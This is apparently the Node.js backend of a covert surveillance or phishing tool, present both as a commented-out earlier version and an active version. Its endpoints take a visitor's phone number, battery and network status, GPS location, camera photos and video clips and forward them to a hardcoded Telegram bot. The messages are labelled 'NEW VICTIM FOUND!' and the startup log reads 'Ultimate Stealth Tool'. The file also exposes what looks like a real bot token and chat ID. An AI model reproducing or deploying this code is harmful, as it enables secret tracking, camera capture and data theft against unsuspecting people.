// const express = require('express');
// const bodyParser = require('body-parser');
// const path = require('path');
// const fs = require('fs');
// const axios = require('axios');
// const FormData = require('form-data');

// const app = express(); 

// // --- Config (তোমার টেলিগ্রাম ডিটেইলস) ---
// const TELEGRAM_BOT_TOKEN = '6960217292:AAGqg4_Q-IdVxJyoictdMmWJ9mH3fun_tiY';
// const CHAT_ID = '6146766939';

// // অটো ফোল্ডার ক্রিয়েশন
// ['./images', './videos', './logs'].forEach(dir => {
//     if (!fs.existsSync(dir)) fs.mkdirSync(dir);
// });

// app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
// app.use(bodyParser.json({ limit: '50mb' }));
// app.set('view engine', 'ejs');
// app.use(express.static('public'));

// function sendToTelegram(message) {
//     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
//         chat_id: CHAT_ID,
//         text: message,
//         parse_mode: 'HTML'
//     }).catch(err => console.log("Text Error"));
// }

// function sendFileToTelegram(filePath, caption) {
//     const formData = new FormData();
//     formData.append('chat_id', CHAT_ID);
//     formData.append('caption', caption);
//     formData.append('document', fs.createReadStream(filePath));

//     axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, formData, {
//         headers: formData.getHeaders()
//     }).then(() => { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); })
//     .catch(err => console.log("File Error"));
// }

// app.get('/', (req, res) => { res.render('index'); });

// app.post('/info', (req, res) => {
//     const rawData = decodeURIComponent(req.body.data || '');
//     sendToTelegram(`<b>🚀 DATA CAPTURED:</b>\n\n<pre>${rawData}</pre>`);
//     res.send('ok');
// });

// app.post('/camsnap', (req, res) => {
//     const base64Data = req.body.img.replace(/^data:image\/png;base64,/, "");
//     const filename = `img_${Date.now()}.png`;
//     const filePath = path.join(__dirname, 'images', filename);
//     fs.writeFileSync(filePath, base64Data, 'base64');
//     sendFileToTelegram(filePath, "📸 Camera Shot");
//     res.send('ok');
// });

// app.post('/video-upload', (req, res) => {
//     const base64Data = req.body.video.replace(/^data:video\/webm;base64,/, "");
//     const filename = `vid_${Date.now()}.webm`;
//     const filePath = path.join(__dirname, 'videos', filename);
//     fs.writeFileSync(filePath, base64Data, 'base64');
//     sendFileToTelegram(filePath, "🎥 Video Clip");
//     res.send('ok');
// });

// const PORT = process.env.PORT || 3000;
// app.listen(PORT, () => console.log(`🚀 Final Tool Running on Port ${PORT}`));



const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const app = express(); 

// --- Config ---
const TELEGRAM_BOT_TOKEN = '6960217292:AAGqg4_Q-IdVxJyoictdMmWJ9mH3fun_tiY';
const CHAT_ID = '6146766939';

['./images', './videos'].forEach(dir => { if (!fs.existsSync(dir)) fs.mkdirSync(dir); });

app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.set('view engine', 'ejs');
app.use(express.static('public'));

function sendToTelegram(message) {
    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: false
    }).catch(e => console.log("TG Error"));
}

function sendFileToTelegram(filePath, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', caption);
    formData.append('document', fs.createReadStream(filePath));
    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, formData, {
        headers: formData.getHeaders()
    }).then(() => { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); })
    .catch(e => console.log("File Error"));
}

app.get('/', (req, res) => { res.render('index'); });

app.post('/info', (req, res) => {
    const data = JSON.parse(decodeURIComponent(req.body.data));
    const msg = `<b>🔥 NEW VICTIM FOUND!</b>\n\n` +
                `<b>📱 Number:</b> <code>${data.phone}</code>\n` +
                `<b>🔋 Battery:</b> ${data.battery}\n` +
                `<b>🌐 Network:</b> ${data.network}\n` +
                `<b>📍 Location:</b> <a href="${data.map}">Open Map</a>\n\n` +
                `<i>🛰️ Lat/Lon: ${data.coords}</i>`;
    sendToTelegram(msg);
    res.send('ok');
});

app.post('/camsnap', (req, res) => {
    const base64Data = req.body.img.replace(/^data:image\/jpeg;base64,/, "");
    const filePath = path.join(__dirname, 'images', `img_${Date.now()}.jpg`);
    fs.writeFileSync(filePath, base64Data, 'base64');
    sendFileToTelegram(filePath, "📸 Photo Evidence");
    res.send('ok');
});

app.post('/video-upload', (req, res) => {
    const base64Data = req.body.video.replace(/^data:video\/webm;base64,/, "");
    const filePath = path.join(__dirname, 'videos', `vid_${Date.now()}.webm`);
    fs.writeFileSync(filePath, base64Data, 'base64');
    sendFileToTelegram(filePath, "🎥 Video Clip");
    res.send('ok');
});

app.listen(3000, () => console.log(`🚀 Ultimate Stealth Tool Running!`));